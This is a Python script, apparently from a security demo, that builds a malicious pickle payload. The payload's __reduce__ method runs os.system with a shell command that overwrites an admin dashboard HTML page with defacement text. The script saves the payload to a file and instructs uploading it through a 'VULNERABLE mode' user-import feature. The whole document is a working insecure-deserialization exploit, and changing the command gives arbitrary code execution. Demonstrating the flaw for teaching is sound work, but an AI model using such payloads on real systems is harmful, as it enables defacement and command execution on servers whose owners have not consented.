import pickle
import os

class DefacePagePayload:
    def __init__(self, target_file_path, new_content):
        self.command = f"echo '{new_content}' > {target_file_path}"

    def __reduce__(self):
        return (os.system, (self.command,))


if __name__ == "__main__":

    target_html_file = "frontend/pages/admin-dashboard.html" 
    defacement_content = "<h1>This Admin Dashboard Has Been PWNED!</h1><p>Insecure Deserialization is Dangerous!</p>"
    
    command_to_run = f"echo '{defacement_content}' > {target_html_file}"

    print(f"Payload will attempt to execute: {command_to_run}")
    print(f"This will try to overwrite: {os.path.abspath(target_html_file)} (assuming app.py is in current dir for relative path)")

    payload_object = DefacePagePayload(target_file_path=target_html_file, new_content=defacement_content)
    pickled_data_bytes = pickle.dumps(payload_object)
    output_filename = "deface_admin_dashboard.dat"

    with open(output_filename, "wb") as f:
        f.write(pickled_data_bytes)


    print(f"\nMalicious defacement payload file '{output_filename}' created successfully.")
    print(f"Upload this file via 'Import a User' in VULNERABLE mode.")
    print(f"After import, try to access the admin dashboard page to see the defacement.")
    print("\nIMPORTANT: Remember to restore your original 'admin-dashboard.html' file after the demo (from git)!")